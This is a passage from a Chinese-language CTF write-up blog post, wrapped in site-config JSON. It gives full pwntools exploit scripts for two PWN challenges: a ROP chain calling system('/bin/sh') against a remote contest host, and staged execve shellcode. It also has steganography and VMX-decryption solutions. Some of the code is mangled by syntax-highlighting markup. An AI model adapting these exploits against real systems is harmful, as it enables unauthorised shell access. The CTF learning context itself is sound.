生成随机初始向量IV</span>\n\t\tprint <span class=\"hljs-string\">\"iv is\"</span>,iv.encode(<span class=\"hljs-string\">'hex'</span>)\n\t\taes = AES.new(<span class=\"hljs-keyword\">self</span>.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=<span class=\"hljs-string\">\"\"</span>\n\n\t\t<span class=\"hljs-comment\">#msg=self.pad(plaintext)</span>\n\t\t<span class=\"hljs-keyword\">for</span> block <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">self</span>.split_by(ciphertext, <span class=\"hljs-number\">16</span>):\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(block, prev_pt)\n\t\t\tct_block = aes.decrypt(ct_block)\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\t<span class=\"hljs-keyword\">return</span> b2a_hex(iv + ct)\n\t\t\ns = <span class=\"hljs-string\">'524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa'</span> \niv = s[<span class=\"hljs-number\">0</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">32</span>].decode(<span class=\"hljs-string\">'hex'</span>)\nsc = s[<span class=\"hljs-number\">32</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-symbol\">:</span>].decode(<span class=\"hljs-string\">'hex'</span>)\nprint len(iv),len(sc)\nflag = <span class=\"hljs-string\">'A'</span>*<span class=\"hljs-number\">64</span>\n\nBS = AES.block_size <span class=\"hljs-comment\"># aes数据分组长度为128 bit</span>\nkey=<span class=\"hljs-string\">\"asdfghjkl1234567890qwertyuiopzxc\"</span>\ndemo = aesdemo(key)\ne = demo.encrypt(flag)\nprint(<span class=\"hljs-string\">\"加密：\"</span>, e)\n\naaa = demo.decrypt(sc,iv)\nprint aaa\nprint aaa.decode(<span class=\"hljs-string\">'hex'</span>)</code></pre></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p><strong>大大大佬的博客-&gt;<a href=\"https://delcoding.github.io/2018/12/pcb-writeup/\" target=\"_blank\" rel=\"noopener\">传送门</a></strong></p>","more":"<h3 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h3><h4 id=\"0x00-overInt\"><a href=\"#0x00-overInt\" class=\"headerlink\" title=\"0x00 overInt\"></a>0x00 overInt</h4><p>思路：有两个key的检测，过了之后有一个循环以下内容<br><pre><code class=\"hljs undefined\">*(&amp;<span class=\"hljs-built_in\">v8</span> + <span class=\"hljs-built_in\">v6</span>) = <span class=\"hljs-built_in\">v5</span><span class=\"hljs-comment\">;</span>\n<span class=\"hljs-symbol\">v3</span> = (int *)(unsigned int)<span class=\"hljs-built_in\">v5</span><span class=\"hljs-comment\">;</span>\n<span class=\"hljs-symbol\">printf</span>(<span class=\"hljs-string\">\"str_pos is %c\\n\"</span>, <span class=\"hljs-built_in\">v3</span>)<span class=\"hljs-comment\">;</span></code></pre></p>\n<p>这里直接将输入的值写到一个地址的偏移，就有一个任意地址写的洞，然后通过这个进行常规的rop<br>exp如下<br><pre><code class=\"hljs undefined\">from pwn import *\nfrom struct import pack\ncontext(os=<span class=\"hljs-string\">'linux'</span>,arch=<span class=\"hljs-string\">'amd64'</span>,aslr = <span class=\"hljs-string\">'False'</span>)\n<span class=\"hljs-keyword\">local</span> = <span class=\"hljs-number\">0</span>\nlog_level=<span class=\"hljs-string\">'debug'</span>\n\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">local</span>:\n\tp = process(<span class=\"hljs-string\">\"./overInt\"</span>)<span class=\"hljs-meta\">#,env=&#123;<span class=\"hljs-string\">'LD_PRELOAD'</span>:<span class=\"hljs-string\">'./libc_x64.so.6'</span>&#125;)</span>\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t<span class=\"hljs-meta\">#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)</span>\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">'58.20.46.148'</span>,<span class=\"hljs-number\">35272</span>)\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t<span class=\"hljs-meta\">#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)</span>\n\ndef change_addr(num,<span class=\"hljs-built_in\">string</span>):\n\tj = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"Which position you want to modify?\\n\"</span>)\n\t\tpayload = p32(num)\n\t\tp.<span class=\"hljs-built_in\">send</span>(payload)\n\t\tp.recvuntil(<span class=\"hljs-string\">\"What content you want to write in?\\n\"</span>)\n\t\tpayload = <span class=\"hljs-built_in\">string</span>[j]\n\t\tp.<span class=\"hljs-built_in\">send</span>(payload)\n\t\tnum += <span class=\"hljs-number\">1</span>\n\t\tj += <span class=\"hljs-number\">1</span>\n\t\t\npop_rdi = <span class=\"hljs-number\">0x0000000000400b13</span>\nread_got = elf.got[<span class=\"hljs-string\">\"read\"</span>] <span class=\"hljs-meta\"># 0x602038</span>\nalarm_got = elf.got[<span class=\"hljs-string\">\"alarm\"</span>] <span class=\"hljs-meta\"># 0x602030</span>\nstart = <span class=\"hljs-number\">0x4005D0</span>\nputs_plt = elf.plt[<span class=\"hljs-string\">\"puts\"</span>] <span class=\"hljs-meta\"># 0x40054c</span>\n\n<span class=\"hljs-meta\">#gdb.attach(p,<span class=\"hljs-string\">\"b *0x400AAC\"</span>)</span>\n\np.recvuntil(<span class=\"hljs-string\">\"Please set arrary number:\"</span>)\np.<span class=\"hljs-built_in\">send</span>(<span class=\"hljs-string\">\"over\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"How many numbers do you have?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">10</span>))\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">9</span>):\n\tdata = p.recv()\n\tp.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0</span>))\np.recv() \np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0x20633372</span>))\n\np.recvuntil(<span class=\"hljs-string\">\"How many positions you want to modify?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">32</span>))\n\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#pop_rdi</span>\nchange_addr(<span class=\"hljs-number\">0x38</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#read_got</span>\nchange_addr(<span class=\"hljs-number\">0x40</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#puts_plt</span>\nchange_addr(<span class=\"hljs-number\">0x48</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#start</span>\nchange_addr(<span class=\"hljs-number\">0x50</span>,<span class=\"hljs-built_in\">string</span>)\np.recvuntil(<span class=\"hljs-string\">\"!\"</span>)\ndata = p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-literal\">True</span>)\ndata = data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\ndata = u64(data)\nlibc_base = data - <span class=\"hljs-number\">0x0f7250</span>\nprint <span class=\"hljs-string\">\"base : \"</span>+<span class=\"hljs-built_in\">hex</span>(libc_base)\nbinsh_addr = libc_base + <span class=\"hljs-number\">0x18cd57</span>\nsystem_addr = libc_base + <span class=\"hljs-number\">0x045390</span>\nprint <span class=\"hljs-string\">\"system_addr :\"</span> +<span class=\"hljs-built_in\">hex</span>(system_addr)\nprint <span class=\"hljs-string\">\"binsh_addr :\"</span> +<span class=\"hljs-built_in\">hex</span>(binsh_addr)\n\n<span class=\"hljs-meta\">#gdb.attach(p,<span class=\"hljs-string\">\"b *0x400AAC\"</span>)</span>\n\np.recvuntil(<span class=\"hljs-string\">\"Please set arrary number:\"</span>)\np.<span class=\"hljs-built_in\">send</span>(<span class=\"hljs-string\">\"over\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"How many numbers do you have?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">10</span>))\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">9</span>):\n\tdata = p.recv()\n\tp.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0</span>))\np.recv() \np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0x20633372</span>))\np.recvuntil(<span class=\"hljs-string\">\"How many positions you want to modify?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">24</span>))\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#pop_rdi</span>\nchange_addr(<span class=\"hljs-number\">0x38</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = pack(<span class=\"hljs-string\">'L'</span>,binsh_addr)\nchange_addr(<span class=\"hljs-number\">0x40</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = pack(<span class=\"hljs-string\">'L'</span>,system_addr)\nchange_addr(<span class=\"hljs-number\">0x48</span>,<span class=\"hljs-built_in\">string</span>)\n\np.interactive()</code></pre></p>\n<h4 id=\"0x01-treasure\"><a href=\"#0x01-treasure\" class=\"headerlink\" title=\"0x01 treasure\"></a>0x01 treasure</h4><p>这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。<br>exp如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> struct <span class=\"hljs-keyword\">import</span> pack\n\ncontext(<span class=\"hljs-built_in\">os</span>=<span class=\"hljs-string\">'linux'</span>,arch=<span class=\"hljs-string\">'amd64'</span>,aslr = <span class=\"hljs-string\">'False'</span>)\n<span class=\"hljs-keyword\">local</span> = <span class=\"hljs-number\">1</span>\nlog_level=<span class=\"hljs-string\">'debug'</span>\n\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-name\">local</span>:\n\tp = process(<span class=\"hljs-string\">\"./treasure\"</span>)#,env=&#123;<span class=\"hljs-string\">'LD_PRELOAD'</span>:<span class=\"hljs-string\">'./libc_x64.so.6'</span>&#125;)\n\telf = ELF(<span class=\"hljs-string\">\"./treasure\"</span>)\n\t#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)\n<span class=\"hljs-name\">else</span>:\n\tp = remote(<span class=\"hljs-string\">'58.20.46.148'</span>,<span class=\"hljs-number\">35272</span>)\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)\n\ndef mycode(shellcode):\n\tp.recvuntil(<span class=\"hljs-string\">\"(enter 'n' to quit) :\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"\\x90\"</span>)\n\tp.recvuntil(<span class=\"hljs-string\">\"start!!!!\"</span>)\n\tp.send(shellcode)\n\ntest = <span class=\"hljs-string\">\"abcdefghi\"</span>\n\n#gdb.attach(p,<span class=\"hljs-string\">\"b *0x4009BA\"</span> ) #b *<span class=\"hljs-number\">0x400AAE</span><span class=\"hljs-string\">\")\n\ntrea_addr = 0x4009BA\n\nshellcode = asm(\"</span>mov r15,rdx;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*6)\nmycode(shellcode)\nshellcode = asm(\"</span>mov ebx,<span class=\"hljs-number\">0x400A6c</span>;mov r14,rbx;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*1)\nmycode(shellcode)\n\nshellcode = asm(\"</span>mov ebx,<span class=\"hljs-number\">30</span>;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*4)\nmycode(shellcode)\n\nshellcode = asm(\"</span>mov rax,r15;mov rsi,rbx;jmp r14;<span class=\"hljs-string\">\")\nmycode(shellcode)\n\nshellcode = \"</span>\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05<span class=\"hljs-string\">\"\np.sendline(shellcode)\n\"</span><span class=\"hljs-string\">\"\"</span>\np.recvuntil(<span class=\"hljs-string\">\"(enter 'n' to quit) :\"</span>)\np.sendline(<span class=\"hljs-string\">\"\\x90\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"start!!!!\"</span>)\np.send(test)\n<span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\np.interactive()</span></code></pre></p>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"0x02-traffic-light\"><a href=\"#0x02-traffic-light\" class=\"headerlink\" title=\"0x02 traffic light\"></a>0x02 traffic light</h4><p>题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag</p>\n<h4 id=\"0x03-GreatWall\"><a href=\"#0x03-GreatWall\" class=\"headerlink\" title=\"0x03 GreatWall\"></a>0x03 GreatWall</h4><p>lsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符<br><pre><code class=\"hljs undefined\">#encoding:utf-<span class=\"hljs-number\">8</span>\nlist1 = [<span class=\"hljs-number\">1010011</span>,<span class=\"hljs-number\">1110100,110011</span>,<span class=\"hljs-number\">1100111,110100</span>,<span class=\"hljs-number\">1101110,110000</span>,<span class=\"hljs-number\">1100111</span>,<span class=\"hljs-number\">1110010</span>,<span class=\"hljs-number\">110100</span>,<span class=\"hljs-number\">1110000</span>,<span class=\"hljs-number\">1101000</span>,<span class=\"hljs-number\">1111001</span>,<span class=\"hljs-number\">1011111,110001</span>,<span class=\"hljs-number\">1110011</span>,<span class=\"hljs-number\">1011111,110001</span>,<span class=\"hljs-number\">1101110,1110100</span>,<span class=\"hljs-number\">110011</span>,<span class=\"hljs-number\">1110010</span>,<span class=\"hljs-number\">110011</span>,<span class=\"hljs-number\">1110011</span>,<span class=\"hljs-number\">1110100,110001</span>,<span class=\"hljs-number\">1101110,1100111</span>]\nj = ''\nresult =''\nfor i in range(len(list1)):\n    tmp = int(str(list1[i]),<span class=\"hljs-number\">2</span>)\n    result += chr(tmp)\n    print result</code></pre></p>\n<h4 id=\"0x04-hack1t\"><a href=\"#0x04-hack1t\" class=\"headerlink\" title=\"0x04 hack1t\"></a>0x04 hack1t</h4><p>这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解<br><a href=\"https://github.com/RF3/VMwareVMX\" target=\"_blank\" rel=\"noopener\">GitHub项目</a><br>但是这个项目的代码有一点瑕疵，直接解密会触发一个错误<br><img src=\"/img/2018-12-03/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><pre><code class=\"hljs undefined\">root<span class=\"hljs-variable\">@Ubuntu</span><span class=\"hljs-symbol\">:~/Desktop/VMwareVMX-master</span><span class=\"hljs-comment\"># python3 main.py \"Ubuntu 64-bit.vmx\" </span>\n<span class=\"hljs-symbol\">Password:</span>\n<span class=\"hljs-symbol\">Error:</span> File Ubuntu <span class=\"hljs-number\">64</span>-bit.vmx is <span class=\"hljs-keyword\">not</span> a valid VMX file</code></pre></p>\n<p>原因是代码中给的<code>displayname</code>是小写，但是判断却是大写<code>displayName</code>,修改成小写即可<br><img src=\"/img/2018-12-03/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>然后就可以得到解密后的vmx配置信息<br><pre><code class=\"hljs undefined\">root@Ubuntu:~/Desktop/VMwareVMX-master<span class=\"hljs-comment\"># python3 main.py \"Ubuntu 64-bit.vmx\" </span>\nPassword:\n<span class=\"hljs-attr\">guestos</span> = <span class=\"hljs-string\">\"ubuntu-64\"</span>\nvirtualhw.<span class=\"hljs-attr\">version</span> = <span class=\"hljs-string\">\"13\"</span>\nconfig.<span class=\"hljs-attr\">version</span> = <span class=\"hljs-string\">\"8\"</span>\n<span class=\"hljs-attr\">numvcpus</span> = <span class=\"hljs-string\">\"2\"</span>\ncpuid.<span class=\"hljs-attr\">coresPerSocket</span> = <span class=\"hljs-string\">\"1\"</span>\n<span class=\"hljs-attr\">memsize</span> = <span class=\"hljs-string\">\"2048\"</span>\npciBridge0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge4.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge4.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge4.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge5.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge5.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge5.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge6.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge6.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge6.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge7.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge7.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge7.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\nvmci0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nmks.<span class=\"hljs-attr\">enable3d</span> = <span class=\"hljs-string\">\"true\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">deviceType</span> = <span class=\"hljs-string\">\"disk\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">fileName</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit-disk1.vmdk\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">mode</span> = <span class=\"hljs-string\">\"persistent\"</span>\nscsi0.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"lsilogic\"</span>\nscsi0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nsata0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nvmci0.<span class=\"hljs-attr\">unrestricted</span> = <span class=\"hljs-string\">\"false\"</span>\nvcpu.<span class=\"hljs-attr\">hotadd</span> = <span class=\"hljs-string\">\"true\"</span>\nmem.<span class=\"hljs-attr\">hotadd</span> = <span class=\"hljs-string\">\"true\"</span>\npowerType.<span class=\"hljs-attr\">powerOff</span> = <span class=\"hljs-string\">\"soft\"</span>\npowerType.<span class=\"hljs-attr\">reset</span> = <span class=\"hljs-string\">\"soft\"</span>\npowerType.<span class=\"hljs-attr\">suspend</span> = <span class=\"hljs-string\">\"soft\"</span>\ntoolscripts.<span class=\"hljs-attr\">afterpoweron</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">afterresume</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">beforepoweroff</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">beforesuspend</span> = <span class=\"hljs-string\">\"true\"</span>\ntools.<span class=\"hljs-attr\">syncTime</span> = <span class=\"hljs-string\">\"false\"</span>\n<span class=\"hljs-attr\">nvram</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit-file1.nvram\"</span>\nvirtualHW.<span class=\"hljs-attr\">productCompatibility</span> = <span class=\"hljs-string\">\"hosted\"</span>\n<span class=\"hljs-attr\">extendedConfigFile</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit.vmxf\"</span>\n<span class=\"hljs-attr\">dataFileKey</span> = <span class=\"hljs-string\">\"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d\"</span>\n<span class=\"hljs-attr\">cryptoState</span> = <span class=\"hljs-string\">\"encrypted\"</span>\nisolation.tools.copy.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nisolation.tools.dnd.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nisolation.tools.paste.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npolicy.vm.<span class=\"hljs-attr\">mvmtid</span> = <span class=\"hljs-string\">\"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29\"</span>\nrollingTier0.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier0.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"86400\"</span>\nrollingTier0.<span class=\"hljs-attr\">maximum</span> = 